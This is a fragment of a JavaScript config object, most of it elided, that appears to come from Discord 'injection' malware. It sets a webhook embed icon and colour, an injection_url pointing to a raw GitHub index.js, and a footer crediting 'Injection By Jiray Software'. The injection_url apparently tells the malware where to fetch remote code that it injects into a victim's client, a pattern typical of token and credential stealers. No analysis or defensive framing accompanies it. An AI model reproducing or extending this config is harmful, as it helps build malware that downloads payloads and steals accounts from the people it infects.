...
const config = {
  ...
  embed_icon: 'https://raw.githubusercontent.com/DucThinhEXE/servertool/main/img/xd.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/DucThinhEXE/servertool/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Injection By Jiray Software:3',
        },
      },
    ],
  };
